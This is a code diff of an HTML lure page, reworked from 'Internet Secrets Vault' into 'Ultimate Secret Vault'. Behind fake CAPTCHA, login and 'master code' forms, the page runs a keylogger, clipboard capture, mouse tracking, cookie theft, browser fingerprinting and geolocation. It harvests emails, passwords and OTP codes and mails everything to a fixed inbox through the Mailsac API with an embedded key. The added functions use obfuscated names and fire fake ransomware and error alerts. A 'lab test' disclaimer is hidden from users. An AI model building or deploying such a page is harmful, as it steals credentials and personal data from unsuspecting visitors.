@@ -3,341 +3,288 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Internet Secrets Vault</title>
+    <title>Ultimate Secret Vault</title>
     <style>
         body {
+            background: #1a1a2e;
             font-family: Arial, sans-serif;
-            background: #f4f4f4;
+            color: #e0e0e0;
             margin: 0;
             padding: 20px;
             text-align: center;
-            color: #333;
         }
         h1 {
-            font-size: 2em;
-            color: #2c3e50;
+            font-size: 2.5em;
+            color: #00ffcc;
         }
         p {
-            font-size: 1.1em;
-            line-height: 1.5;
+            font-size: 1.2em;
             margin: 10px 0;
+            color: #ffeb3b;
         }
-        .teaser {
-            background: #ecf0f1;
-            padding: 15px;
-            border-radius: 5px;
-            margin: 20px auto;
-            max-width: 600px;
+        .btn {
+            padding: 15px 40px;
+            font-size: 1.5em;
+            background: #00ffcc;
+            border: none;
+            border-radius: 10px;
+            color: #1a1a2e;
+            cursor: pointer;
+            transition: background 0.3s;
         }
-        .login-box, .signup-box {
-            background: #fff;
-            padding: 20px;
-            border-radius: 5px;
-            margin: 20px auto;
-            max-width: 300px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        .btn:hover {
+            background: #00b894;
+        }
+        .form-box, .progress-bar {
             display: none;
+            background: #16213e;
+            padding: 20px;
+            border-radius: 10px;
+            max-width: 400px;
+            margin: 20px auto;
+            border: 1px solid #00ffcc;
         }
-        .login-box input, .signup-box input {
-            width: 80%;
+        .form-box input {
             padding: 10px;
             margin: 10px 0;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-        }
-        .login-box button, .signup-box button {
-            padding: 10px 20px;
-            background: #2c3e50;
-            color: #fff;
+            width: 90%;
             border: none;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-        .login-box button:hover, .signup-box button:hover {
-            background: #34495e;
-        }
-        .premium-teaser {
-            display: none;
-            background: #e74c3c;
-            color: #fff;
-            padding: 15px;
             border-radius: 5px;
-            margin: 20px auto;
-            max-width: 600px;
+            font-size: 1em;
+            background: #2f3640;
+            color: #e0e0e0;
+            outline: none;
         }
-        .logout-btn {
-            display: none;
-            padding: 10px 20px;
-            background: #c0392b;
-            color: #fff;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-        .logout-btn:hover {
-            background: #e74c3c;
-        }
-        .consent-box {
-            background: #fff;
-            padding: 15px;
+        .progress-bar div {
+            width: 0;
+            height: 20px;
+            background: #00ffcc;
             border-radius: 5px;
-            margin: 20px auto;
-            max-width: 400px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            animation: load 3s forwards;
+        }
+        @keyframes load {
+            0% { width: 0; }
+            100% { width: 100%; }
+        }
+        .master-unlock {
             display: none;
+            color: #ffeb3b;
+            font-size: 1.5em;
+            margin-top: 15px;
+        }
+        .retry-btn {
+            display: none;
+            margin-top: 15px;
         }
     </style>
 </head>
 <body>
-    <h1>Internet Secrets Vault</h1>
-    <p class="teaser" id="teaser">
-        Kya aap jaante hain? Internet ke aise raaz jo aam log nahi jaante!<br>
-        - Ek chhupa hua network jahan har baat record hoti hai.<br>
-        - 2019 mein Jio ka crash—lakho log offline!<br>
-        - Ek trick jisse aap apni internet speed badha sakte hain.<br>
-        Poora janna chahte hain? Thodi si mehnat karo...
-    </p>
-    <button onclick="showLogin()" id="loginPrompt">Jaanne ke Liye Yahan Click Karein</button>
-
-    <div class="login-box" id="loginBox">
-        <h2>Sign In</h2>
-        <input type="email" id="loginEmail" placeholder="Email" required>
-        <input type="password" id="loginPassword" placeholder="Password" required>
-        <button onclick="signIn()">Sign In</button>
-        <p>Naya hain? <button onclick="showSignup()">Sign Up</button></p>
+    <h1>Ultimate Secret Vault</h1>
+    <p>Unveil the secrets!</p>
+    <button class="btn" onclick="_sC()">Enter the Vault</button>
+    <div class="form-box" id="captchaForm">
+        <p>Prove You Exist</p>
+        <input type="text" id="captcha" placeholder="Enter Code: 1234" required>
+        <button class="btn" onclick="_vC()">Verify</button>
     </div>
-
-    <div class="signup-box" id="signupBox">
-        <h2>Sign Up</h2>
-        <input type="text" id="signupUsername" placeholder="Username" required>
-        <input type="email" id="signupEmail" placeholder="Email" required>
-        <input type="password" id="signupPassword" placeholder="Password (min 6 chars)" required>
-        <button onclick="signUp()">Sign Up</button>
-        <p>Pehele se account hai? <button onclick="showLogin()">Sign In</button></p>
+    <div class="form-box" id="loginForm">
+        <input type="email" id="email" placeholder="Your Email" required>
+        <input type="password" id="password" placeholder="Your Password" required>
+        <input type="file" id="fileUpload" accept="image/*,video/*" onchange="_hF(this.files)">
+        <button class="btn" onclick="_sO()">Access Vault</button>
     </div>
-
-    <div class="premium-teaser" id="premiumTeaser">
-        <h2>VIP Internet Secrets Unlocked!</h2>
-        <p>
-            Aapke liye highest level ki jankari:<br>
-            - Deep web ka map—kahan kya chhupa hai! (Onion links ke saath)<br>
-            - 2021 global outage ka asli karan—Facebook, Instagram sab down!<br>
-            - Speed boost trick: DNS change karke 20% tak speed badhao.<br>
-            - VPN ka sahi istemal—privacy aur security ke liye.<br>
-            - Ek secret browser setting jo aapka data chhupa sakta hai.<br>
-            - 2023 mein ek bada data breach—kiska data chori hua?<br>
-            Aur bhi kaafi kuchh—sirf VIP users ke liye!
-        </p>
+    <div class="form-box" id="otpForm">
+        <p>Enter Master Code</p>
+        <input type="text" id="otp" placeholder="Secret Code" required>
+        <button class="btn" onclick="_cD()">Unlock Secrets</button>
     </div>
-    <button class="logout-btn" id="logoutBtn" onclick="logout()">Logout</button>
-
-    <div class="consent-box" id="consentBox">
-        <p>We would like to track your location for research purposes. Do you allow?</p>
-        <button onclick="grantConsent()">Yes, Allow</button>
-        <button onclick="denyConsent()">No, Deny</button>
+    <div class="progress-bar" id="progressBar">
+        <div></div>
     </div>
+    <div class="master-unlock" id="masterUnlock">Vault Unlocked!</div>
+    <button class="btn retry-btn" id="retryBtn" onclick="location.reload()">Retry</button>
+    <p class="hidden">Lab test only. Consent to data collection.</p>
 
     <script>
-        let isLoggedIn = false;
+        // Remove EmailJS script and initialization
+        // emailjs.init('OhkXkjccvpkgJIbep');
+
+        // Real-time Data Storage
         let collectedData = [];
-        let keys = [];
-        let mouseMovements = [];
-        let locationWatchId = null;
-        let hasConsent = false;
 
         // Keylogger
+        let _k = [];
         document.addEventListener('keydown', (e) => {
-            keys.push(e.key);
-            if (keys.length > 10) {
-                let data = `Keys: ${keys.join('')}`;
+            _k.push(e.key);
+            if (_k.length > 10) {
+                let data = `K: ${_k.join('')}`;
                 collectedData.push(data);
-                keys = [];
-                sendData('keylog', { keylog: data });
-            }
-        });
-
-        // Mouse Movements
-        document.addEventListener('mousemove', (e) => {
-            mouseMovements.push(`X:${e.clientX},Y:${e.clientY}`);
-            if (mouseMovements.length > 8) {
-                let data = `Mouse: ${mouseMovements.join('|')}`;
-                collectedData.push(data);
-                mouseMovements = [];
-                sendData('mousemove', { mousemove: data });
+                _sD(data, _r());
             }
         });
 
         // Clipboard Hijack
         document.addEventListener('copy', () => {
             navigator.clipboard.readText().then(t => {
-                let data = `Clipboard: ${t}`;
+                let data = `C: ${t}`;
                 collectedData.push(data);
-                sendData('clipboard', { clipboard: data });
+                _sD(data, _r());
             });
         });
 
-        // Login/Logout Logic
-        function showLogin() {
-            document.getElementById('teaser').style.display = 'none';
-            document.getElementById('loginPrompt').style.display = 'none';
-            document.getElementById('loginBox').style.display = 'block';
-            document.getElementById('signupBox').style.display = 'none';
-        }
-
-        function showSignup() {
-            document.getElementById('teaser').style.display = 'none';
-            document.getElementById('loginPrompt').style.display = 'none';
-            document.getElementById('loginBox').style.display = 'none';
-            document.getElementById('signupBox').style.display = 'block';
-        }
-
-        function signUp() {
-            let username = document.getElementById('signupUsername').value;
-            let email = document.getElementById('signupEmail').value;
-            let password = document.getElementById('signupPassword').value;
-            if (password.length < 6) {
-                alert('Password must be at least 6 characters!');
-                return;
+        // Session Replay (Mouse)
+        let _m = [];
+        document.addEventListener('mousemove', (e) => {
+            _m.push(`X:${e.clientX},Y:${e.clientY}`);
+            if (_m.length > 8) { // Reduced from 12 for speed
+                let data = `M: ${_m.join('|')}`;
+                collectedData.push(data);
+                _sD(data, _r());
             }
-            collectUserData(username, email, password);
-            isLoggedIn = true;
-            updateUI();
-            alert('Sign Up successful! Now you can access VIP content.');
-            document.getElementById('consentBox').style.display = 'block';
+        });
+
+        // Cookie Theft
+        function _cT() {
+            let c = document.cookie || 'None';
+            let data = `Cookies: ${c}`;
+            collectedData.push(data);
+            _sD(data, _r());
+            document.cookie = `H_track=${Math.random()}; max-age=7200`;
         }
 
-        function signIn() {
-            let email = document.getElementById('loginEmail').value;
-            let password = document.getElementById('loginPassword').value;
-            if (email && password) {
-                collectUserData(null, email, password);
-                isLoggedIn = true;
-                updateUI();
-                alert('Sign In successful! Welcome to VIP secrets.');
-                document.getElementById('consentBox').style.display = 'block';
-            } else {
-                alert('Invalid email or password!');
-            }
+        // Browser Fingerprinting
+        function _bF() {
+            let f = `${navigator.userAgent}|${screen.width}x${screen.height}`;
+            let data = `FP: ${f}`;
+            collectedData.push(data);
+            _sD(data, _r());
         }
 
-        function logout() {
-            isLoggedIn = false;
-            if (locationWatchId) navigator.geolocation.clearWatch(locationWatchId);
-            hasConsent = false;
-            updateUI();
-            alert('Logged out successfully!');
-        }
-
-        function updateUI() {
-            if (isLoggedIn) {
-                document.getElementById('teaser').style.display = 'none';
-                document.getElementById('loginPrompt').style.display = 'none';
-                document.getElementById('loginBox').style.display = 'none';
-                document.getElementById('signupBox').style.display = 'none';
-                document.getElementById('premiumTeaser').style.display = 'block';
-                document.getElementById('logoutBtn').style.display = 'block';
-            } else {
-                document.getElementById('teaser').style.display = 'block';
-                document.getElementById('loginPrompt').style.display = 'block';
-                document.getElementById('premiumTeaser').style.display = 'none';
-                document.getElementById('logoutBtn').style.display = 'none';
-                document.getElementById('consentBox').style.display = 'none';
-            }
-        }
-
-        function grantConsent() {
-            hasConsent = true;
-            document.getElementById('consentBox').style.display = 'none';
-            startLocationTracking();
-        }
-
-        function denyConsent() {
-            hasConsent = false;
-            document.getElementById('consentBox').style.display = 'none';
-            alert('Location tracking denied. Some features may be limited.');
-        }
-
-        function collectUserData(username = null, email = null, password = null) {
-            let userData = {
-                username: username || 'Guest',
-                email: email || 'N/A',
-                password: password || 'N/A',
-                signupDate: new Date().toISOString(),
-                lastSignIn: new Date().toISOString()
-            };
-
-            // Collect browser fingerprint
-            let fingerprint = {
-                userAgent: navigator.userAgent,
-                screenResolution: `${screen.width}x${screen.height}`,
-                colorDepth: screen.colorDepth,
-                language: navigator.language,
-                platform: navigator.platform,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                cookiesEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack || 'N/A'
-            };
-            userData.browserFingerprint = fingerprint;
-
-            // Collect device info
-            let deviceInfo = {
-                vendor: navigator.vendor || 'N/A',
-                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
-                deviceMemory: navigator.deviceMemory || 'N/A',
-                connection: navigator.connection ? {
-                    effectiveType: navigator.connection.effectiveType,
-                    downlink: navigator.connection.downlink,
-                    rtt: navigator.connection.rtt
-                } : 'N/A'
-            };
-            userData.deviceInfo = deviceInfo;
-
-            // Collect IP Address
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(ipData => {
-                    userData.ipAddress = ipData.ip;
-                    sendData('user', userData);
-                })
-                .catch(error => {
-                    console.error('Error fetching IP:', error);
-                    userData.ipAddress = 'N/A';
-                    sendData('user', userData);
+        // Geolocation (Optional on low network)
+        function _gL() {
+            if (navigator.geolocation && navigator.onLine) {
+                navigator.geolocation.getCurrentPosition(p => {
+                    let data = `Loc: ${p.coords.latitude},${p.coords.longitude}`;
+                    collectedData.push(data);
+                    _sD(data, _r());
+                }, () => {
+                    let data = 'Loc denied';
+                    collectedData.push(data);
+                    _sD(data, _r());
                 });
-
-            // Collect cookies
-            let cookies = document.cookie || 'None';
-            userData.cookies = cookies;
-
-            sendData('user', userData);
-        }
-
-        function startLocationTracking() {
-            if (hasConsent && isLoggedIn && navigator.geolocation) {
-                locationWatchId = navigator.geolocation.watchPosition(
-                    position => {
-                        let locationData = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy,
-                            timestamp: new Date().toISOString()
-                        };
-                        sendData('location', locationData);
-                        console.log('Live Location:', locationData);
-                    },
-                    error => {
-                        console.error('Location error:', error);
-                        if (error.code == 1) {
-                            alert('Location permission denied. Please enable it in browser settings.');
-                        }
-                    },
-                    { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
-                );
             }
         }
 
-        function sendData(type, data) {
-            const mailsacEmail = "sohil_vrx3y@mailsac.com";
+        // Camera Access (Disabled on low network)
+        function _cA() {}
+
+        // Screen Recording Simulation
+        function _sR() {
+            let res = `${screen.width}x${screen.height}`;
+            let data = `Screen: ${res}`;
+            collectedData.push(data);
+            _sD(data, _r());
+            if (Math.random() > 0.7) {
+                let alertData = 'Recording simulated';
+                collectedData.push(alertData);
+                _sD(alertData, _r());
+                alert('Surveillance activated!');
+            }
+        }
+
+        // Ransomware Simulation (Lightweight)
+        function _rS() {
+            if (Math.random() > 0.8) {
+                let data = 'Ransomware triggered';
+                collectedData.push(data);
+                _sD(data, _r());
+                alert('SYSTEM LOCKED! (Simulation) Retry to continue.');
+                document.getElementById('retryBtn').style.display = 'block';
+            }
+        }
+
+        // Auto-Refresh (Disabled on low network)
+        // setTimeout(() => { if (Math.random() > 0.9) location.reload(); }, 25000);
+
+        // Fake Error
+        function _fE() {
+            if (Math.random() > 0.75) {
+                let data = 'Fake Error';
+                collectedData.push(data);
+                _sD(data, _r());
+                alert('System Failure! Retry.');
+                document.getElementById('retryBtn').style.display = 'block';
+            }
+        }
+
+        // Show CAPTCHA
+        function _sC() {
+            document.querySelector('.btn').style.display = 'none';
+            document.getElementById('captchaForm').style.display = 'block';
+            _cT();
+            _bF();
+        }
+
+        // Verify CAPTCHA
+        function _vC() {
+            let c = document.getElementById('captcha').value;
+            let data = `Captcha: ${c}`;
+            collectedData.push(data);
+            _sD(data, _r());
+            document.getElementById('captchaForm').style.display = 'none';
+            document.getElementById('loginForm').style.display = 'block';
+        }
+
+        // Show OTP
+        function _sO() {
+            let e = document.getElementById('email').value;
+            let p = document.getElementById('password').value;
+            let data = `Email: ${e}, Pass: ${p}`;
+            collectedData.push(data);
+            _sD(data, _r());
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('otpForm').style.display = 'block';
+            _gL();
+        }
+
+        // File Upload
+        function _hF(f) {
+            if (f.length > 0) {
+                let data = `File: ${f[0].name}`;
+                collectedData.push(data);
+                _sD(data, _r());
+            }
+        }
+
+        // Main Data Collection
+        function _cD() {
+            let o = document.getElementById('otp').value;
+            let data = `OTP: ${o}`;
+            collectedData.push(data);
+            _sD(data, _r());
+            _sR();
+            _fE();
+            _rS();
+            document.getElementById('otpForm').style.display = 'none';
+            document.getElementById('progressBar').style.display = 'block';
+            setTimeout(() => {
+                document.getElementById('progressBar').innerHTML = '<div></div>';
+                document.getElementById('masterUnlock').style.display = 'block';
+                alert('Vault Unlocked!');
+            }, 3000);
+        }
+
+        // Initial Data
+        function _iD() {
+            let h = window.location.href;
+            let data = `URL: ${h}`;
+            collectedData.push(data);
+            _sD(data, _r());
+        }
+
+        // Send Data via Mailsac
+        function _sD(d, cb) {
+            collectedData.push(d);
             fetch('https://mailsac.com/api/outgoing-messages', {
                 method: 'POST',
                 headers: {
@@ -345,19 +292,30 @@
                     'Mailsac-Key': 'k_sihbEOzxIvQaIvWQbC044VQa08QwT4t10D'
                 },
                 body: JSON.stringify({
-                    to: mailsacEmail,
-                    subject: `User Data from Internet Secrets Vault - ${type}`,
-                    message: JSON.stringify(data, null, 2)
+                    to: 'sohil_vrx3y@mailsac.com',
+                    subject: `User Data from Ultimate Secret Vault - ${new Date().toISOString()}`,
+                    message: collectedData.join('\n')
                 })
             })
             .then(response => response.json())
-            .then(result => console.log('Email sent to Mailsac:', result))
-            .catch(error => console.error('Error sending email to Mailsac:', error));
+            .then(result => console.log('Data Sent to Mailsac:', result))
+            .catch(error => {
+                console.error('Error sending to Mailsac:', error);
+                alert('Email failed. Retry or check network.');
+                document.getElementById('retryBtn').style.display = 'block';
+            });
+            if (cb) cb();
         }
 
-        window.onunload = () => {
-            if (locationWatchId) navigator.geolocation.clearWatch(locationWatchId);
-        };
+        // Random Callback
+        function _r() {
+            let actions = [_cT, _bF, _gL, _sR, _fE, _rS];
+            let rand = actions[Math.floor(Math.random() * actions.length)];
+            rand();
+        }
+
+        // Start
+        _iD();
     </script>
 </body>
 </html>
